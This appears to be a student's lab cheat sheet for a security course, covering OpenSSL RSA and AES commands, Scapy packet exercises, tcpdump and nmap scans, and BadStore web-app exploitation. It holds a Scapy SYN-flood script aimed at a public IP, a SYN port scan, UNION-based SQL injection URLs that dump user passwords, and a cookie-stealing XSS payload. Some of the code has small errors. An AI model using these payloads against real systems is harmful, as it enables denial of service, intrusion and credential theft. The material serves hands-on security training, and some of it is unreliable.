RSA
openssl genrsa > key.pri
touch secret.txt
echo "this is secret message" > secret.txt
openssl rsa -in key.pri -pubout -out key.pub
cat key.pub
openssl rsautl -encrypt -in secret.txt -pubin -inkey key.pub -out encmsg.txt
cat encmsg.txt
openssl rsautl -decrypt -in encmsg.txt -inkey key.pri



SCAPY
Certainly. I'll provide answers for all the Scapy-related questions in order, based on the information from the scapylab.docx file and the questions you've mentioned:

1b. Create a frame that consists of an Ethernet layer, with an IP layer on top? With the show method and capture all fields of the frame.

python
from scapy.all import *

frame = Ether()/IP(dst="8.8.8.8")
frame.show()


2b. How to Sniff with Scapy (for 10 packets and show the details of all the packets)

python
from scapy.all import *

packets = sniff(count=10)
packets.summary()


3a. Use function summary and provide minimal information regarding the packet collection. print the IP section of the packet

python
from scapy.all import *

packets = sniff(count=5)
packets.summary()

packets[IP]


4a. Show the source Ethernet address of one frame. Create the callback function that will be run on every packet to print the source Ethernet address of the received frame

python
from scapy.all import *

def print_source_ethernet(packet):
    print(f"Source MAC: {packet[Ether].src}")

sniff(prn=print_source_ethernet, count=5)


5a. Demonstrate the simple filtering function. Filter the frames based on broadcast frame

python
from scapy.all import *

def is_broadcast(packet):
    return packet[Ether].dst == "ff:ff:ff:ff:ff:ff"

sniff(lfilter=is_broadcast, prn=lambda x: x.summary(), count=5)


6a. How to Create Frames in Scapy for Raw data and demonstrate the result.

python
from scapy.all import *

frame = Ether()/Raw(load="This is raw data")
frame.show()
hexdump(frame)


7a. Demonstrate how to Send Frames in Scapy and show the packet captured using wireshark

python
from scapy.all import *

frame = Ether()/IP(dst="8.8.8.8")/ICMP()
sendp(frame)
wireshark(frame)


8a. Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8

python
from scapy.all import *

packet = IP(dst="8.8.8.8")/ICMP()
send(packet)
wireshark(packet)


9a. Demonstrate how to Perform a Port Scan using Scapy tool target www.example.com

python
from scapy.all import *

# Target IP address
target_ip = "93.184.215.14"

# List of ports to scan
ports = [22, 80, 443]

# Perform SYN scan
for port in ports:
    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
    response = sr1(packet, timeout=1)
    if response:
        if response[TCP].flags == "SA":
            print(f"Port {port} is open.")
        elif response[TCP].flags == "RA":
            print(f"Port {port} is closed.")


10a. Craft a DNS query packet using Scapy tool (send and recv dst address 8.8.8.8)

python
from scapy.all import *

packet = IP(dst="8.8.8.8")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
response = sr1(packet,timout=1)
response[DNS].summary()


11a. Create a simple network monitor that watches for ICMP packets using python function callback in Scapy

python
from scapy.all import *
def icmp_cb(pkt):
    if ICMP in pkt:
        print(f"ICMP pkt recieved from {pkt[IP].src}")
sniff(filter="icmp", prn=icmp_cb,timeout=5)


12a. Identify hosts that are up in a local network using Scapy (hint: ARP)

python
from scapy.all import *

target_subnet = "192.168.1.0/24"
answered, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_subnet), timeout=2, verbose=False)

for sent, received in answered:
    print(f"Host Up: {received.psrc} MAC: {received.hwsrc}")


13a. Display the route and measuring transit delays of packets across an IP network with Scapy (on www.example.com, www.google.com)

python
from scapy.all import *

result, _ = traceroute(["www.example.com", "www.google.com"], maxttl=20)
result.show()


14a. Write a scapy program to carryout SYN flooding attack.

python
from scapy.all import *

target_ip = "93.184.215.14"
target_port = 80
for i in range(1000):
    send(IP(dst=target_ip)/TCP(dport=target_port),Â verbose=0)




TCPDUMP
sudo tcpdump -i any -w http_capture.pcap port 80

sudo tcpdump -i any -w https_capture.pcap port 443


tcp && ip.addr == 93.184.215.14

sudo tcpdump -i any -w dns_capture.pcap port 53

sudo tcpdump -i <interface> -w icmp_capture.pcap icmp


sudo tcpdump -i <interface> -w icmp_tcp80_capture.pcap 'icmp or tcp port 80






NMAP

Nmap (Network Mapper) is a powerful network scanning tool used for network discovery and security auditing. The commands listed in your example serve various purposes related to network scanning, service detection, and security assessment. Here's an overview of what each command does:

### Ping Scan (determine which hosts are up)
sh
nmap -sn cricbuzz.com

*Purpose:* Checks which hosts are up and running by sending ICMP echo requests (pings) to the target. This scan does not perform a port scan.


sh
nmap cricbuzz.com

*Purpose:* Performs a standard scan on the target to identify open ports and services. This is the default Nmap scan.

### Scan a Range of IPs
sh
nmap 192.168.1.1-10

*Purpose:* Scans a range of IP addresses to identify hosts, open ports, and services within that range. Useful for discovering multiple hosts in a specified range.


sh
nmap 192.168.1.0/24

*Purpose:* Scans all IP addresses within a subnet to identify active hosts, open ports, and services. Useful for network discovery and inventory.

### Port Scanning
1. *Scan specific ports:*
   sh
   nmap -p 22,80,443 cricbuzz.com
   
   *Purpose:* Scans only the specified ports (22, 80, 443) on the target to identify which of them are open. This can save time compared to scanning all ports.

2. *Scan all 65535 ports:*
   sh
   nmap -p- cricbuzz.com
   
   *Purpose:* Scans all possible ports (1-65535) on the target to ensure no open port is missed. Useful for comprehensive port scanning.

3. *Scan top 1000 ports (default):*
   sh
   nmap cricbuzz.com
   
   *Purpose:* Scans the top 1000 most commonly used ports on the target. This is the default behavior of Nmap and provides a quick overview of the most important ports.


1. *Detect service version:*
   sh
   nmap -sV cricbuzz.com
   
   *Purpose:* Detects the version of the services running on the open ports. Useful for identifying specific software and versions to assess vulnerabilities.

2. *OS detection:*
   sh
   nmap -O cricbuzz.com
   
   *Purpose:* Attempts to determine the operating system of the target. This information can be crucial for vulnerability assessment and network management.

3. *Aggressive scan (combines -sV, -O, and other scans):*
   sh
   nmap -A cricbuzz.com
   
   *Purpose:* Performs a comprehensive scan that combines service version detection, OS detection, and other advanced scans. Useful for a detailed assessment of the target.


1. *Run default scripts:*
   sh
   nmap -sC cricbuzz.com
   
   *Purpose:* Runs a set of default Nmap scripts to perform common tasks such as service detection, vulnerability checks, and more.

2. *Run specific scripts:*
   sh
   nmap --script=http-title cricbuzz.com
   
   *Purpose:* Runs a specific script (http-title) to retrieve the title of the web page on the target. Useful for gathering specific information.

3. *Scan for vulnerabilities:*
   sh
   nmap --script vuln cricbuzz.com
   
   *Purpose:* Runs scripts that check for known vulnerabilities on the target. Helps identify potential security issues.


1. *Save results to a text file:*
   sh
   nmap -oN output.txt cricbuzz.com
   
   *Purpose:* Saves the scan results in a normal text file (output.txt). Useful for documentation and analysis.

2. *Save results in XML format:*
   sh
   nmap -oX output.xml cricbuzz.com
   
   *Purpose:* Saves the scan results in XML format (output.xml). Useful for integration with other tools and systems.

3. *Save results in all formats:*
   sh
   nmap -oA output cricbuzz.com
   
   *Purpose:* Saves the scan results in all available formats with the base name output. Provides flexibility in how results are used and shared.


1. *Verbose output:*
   sh
   nmap -v cricbuzz.com
   
   *Purpose:* Enables verbose output to provide more detailed information during the scan. Useful for troubleshooting and monitoring scan progress.

2. *Increase verbosity:*
   sh
   nmap -vv cricbuzz.com
   
   *Purpose:* Further increases verbosity to give even more detailed information. Useful for deep troubleshooting and detailed monitoring.

3. *Scan without DNS resolution:*
   sh
   nmap -n cricbuzz.com
   
   *Purpose:* Scans the target without performing DNS resolution. Useful for speeding up scans and avoiding DNS-related issues.

4. *Scan using TCP SYN scan (default for root):*
   sh
   nmap -sS cricbuzz.com
   
   *Purpose:* Performs a TCP SYN scan, which is the default scan for root users. This type of scan is stealthy and often faster than a full TCP connection scan.

5. *UDP scan:*
   sh
   nmap -sU cricbuzz.com
   
   *Purpose:* Performs a UDP scan to identify open UDP ports. Useful for discovering services that use UDP instead of TCP.


BADSTORE
1.
cgi-bin/badstore.cgi?searchquery=xx'+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,123,123+from+userdb+LIMIT+2+--+&action=search&x=16&y=7


cgi-bin/badstore.cgi?action=admin

2.
cgi-bin/badstore.cgi?searchquery=x&action=search&x=11&y=9

cgi-bin/badstore.cgi?searchquery=x'+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9


cgi-bin/badstore.cgi?searchquery=x'+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+from+itemdb+--+&action=search&x=11&y=9


3.cgi-bin/badstore.cgi?action=admin
https://md5.gromweb.com/?md5=62072d95acb588c7ee9d6fa0c6c85155
cgi-bin/badstore.cgi?action=supplierportal

4.login as joe supplier :secret
cgi-bin/badstore.cgi?action=viewprevious

5.login to admin
cgi-bin/badstore.cgi?action=adminportal

6. in search box
<script>alert(document.cookie)</script>

7. cgi-bin/badstore.cgi?action=whatsnew
add items to cart

8. am9lQHN1cHBsaWVyLmNvbTo2MjA3MmQ5NWFjYjU4OGM3ZWU5ZDZmYTBjNmM4NTE1NTpKb2UgU3Vw%0AcGxpZXI6Uw%3D%3D%0A;
 https://www.urldecoder.org
https://www.base64decode.org
9. cart id cookie
https://www.urldecoder.org


AES
gedit plain.txt
openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
openssl enc -aes-128-cbc -d -in cipher1.bin -out plain_decrypt.txt -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
gedit plain_decrypt.txt
openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f
ls
head -c 54 pic_original.bmp > header
tail -c +55 pic_ecb.bmp > body_ecb
cat header body_ecb > pic_ecb1.bmp
openssl enc -aes-128-ecb -d -in pic_ecb.bmp -out pic_dec.bmp -k 00112233445566778899aabbccddeeff -iv 0102030405060708090a0b0c0e0f







